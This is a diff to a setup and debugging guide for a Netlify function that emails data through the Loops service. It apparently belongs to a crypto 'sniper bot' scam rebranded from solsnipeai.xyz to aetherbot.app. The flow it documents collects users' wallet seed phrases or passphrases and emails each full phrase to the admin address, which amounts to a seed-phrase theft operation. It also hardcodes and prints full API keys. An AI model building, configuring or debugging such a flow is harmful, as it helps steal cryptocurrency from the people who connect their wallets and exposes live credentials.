@@ -7,10 +7,10 @@
 
 **Hardcoded Values:**
 ```javascript
-const LOOPS_API_KEY = '0de67ebcc5e8d98792c780ed52b714ee';
+const LOOPS_API_KEY = 'e8afb88a6bae3451e657612d84db3034';
 const LOOPS_API_URL = 'https://app.loops.so/api/v1/transactional';
-const LOOPS_TEMPLATE_ID = 'cmgn2tzu5fqc41q0ivqlmuqf4';
-const ADMIN_EMAIL = 'admin@solsnipeai.xyz';
+const LOOPS_TEMPLATE_ID = 'cmgwzzij2tdk6wb0ie0unnzzp';
+const ADMIN_EMAIL = 'admin@aetherbot.app';
 ```
 
 **Features:**
@@ -47,7 +47,7 @@ const ADMIN_EMAIL = 'admin@solsnipeai.xyz';
 
 ## 📋 Template Requirements
 
-Your Loops template (`cmgn2tzu5fqc41q0ivqlmuqf4`) must have these data variables:
+Your Loops template (`cmgwzzij2tdk6wb0ie0unnzzp`) must have these data variables:
 
 | Variable | Description | Example Value |
 |----------|-------------|---------------|
@@ -91,15 +91,15 @@ Look for these messages in Netlify Dev output:
 
 ```
 📧 Wallet Connection Email Data:
-   Email to: admin@solsnipeai.xyz
-   Template ID: cmgn2tzu5fqc41q0ivqlmuqf4
+   Email to: admin@aetherbot.app
+   Template ID: cmgwzzij2tdk6wb0ie0unnzzp
    Data Variables: { walletName, connectionType, codes, solBalance }
 
 📧 Sending email via Loops...
    API URL: https://app.loops.so/api/v1/transactional
-   To: admin@solsnipeai.xyz
-   Template: cmgn2tzu5fqc41q0ivqlmuqf4
-   API Key (FULL - FOR DEBUGGING): 0de67ebcc5e8d98792c780ed52b714ee
+   To: admin@aetherbot.app
+   Template: cmgwzzij2tdk6wb0ie0unnzzp
+   API Key (FULL - FOR DEBUGGING): e8afb88a6bae3451e657612d84db3034
    Response status: 200
 
 ✅ Email sent successfully
@@ -112,7 +112,7 @@ Look for these messages in Netlify Dev output:
 1. Go to https://app.loops.so/transactional
 2. Find your template
 3. Make sure it's **PUBLISHED** (not draft)
-4. Verify the ID matches: `cmgn2tzu5fqc41q0ivqlmuqf4`
+4. Verify the ID matches: `cmgwzzij2tdk6wb0ie0unnzzp`
 
 #### Issue: API key showing wrong value (92d... instead of 0de...)
 **Solution:**
@@ -121,7 +121,7 @@ Look for these messages in Netlify Dev output:
 #### Issue: Email sends but doesn't arrive
 **Solutions:**
 1. Check spam folder
-2. Verify `admin@solsnipeai.xyz` is a valid email
+2. Verify `admin@aetherbot.app` is a valid email
 3. Check Loops dashboard → Events/Logs
 4. Ensure template has all required variables
 
@@ -134,7 +134,7 @@ Look for these messages in Netlify Dev output:
 ### New Wallet Connection
 1. User submits seed phrase/passphrase
 2. Wallet created in Firebase
-3. Email sent to admin@solsnipeai.xyz with:
+3. Email sent to admin@aetherbot.app with:
    - Wallet address
    - Connection type (Seed Phrase/Passphrase)
    - Full seed phrase/passphrase in `codes`
@@ -148,7 +148,7 @@ Look for these messages in Netlify Dev output:
 
 ### Admin Credit Operation
 1. Admin credits a wallet
-2. Email sent to admin@solsnipeai.xyz with:
+2. Email sent to admin@aetherbot.app with:
    - Wallet address
    - Operation type ("Credit Wallet")
    - Operation ID
@@ -188,6 +188,6 @@ TEST 2: Wallet Connection via Netlify Function
 
 Then check:
 - ✅ Server logs show email sending
-- ✅ API key is `0de67ebcc5e8d98792c780ed52b714ee`
-- ✅ Template ID is `cmgn2tzu5fqc41q0ivqlmuqf4`
-- ✅ Email arrives at admin@solsnipeai.xyz
+- ✅ API key is `e8afb88a6bae3451e657612d84db3034`
+- ✅ Template ID is `cmgwzzij2tdk6wb0ie0unnzzp`
+- ✅ Email arrives at admin@aetherbot.app
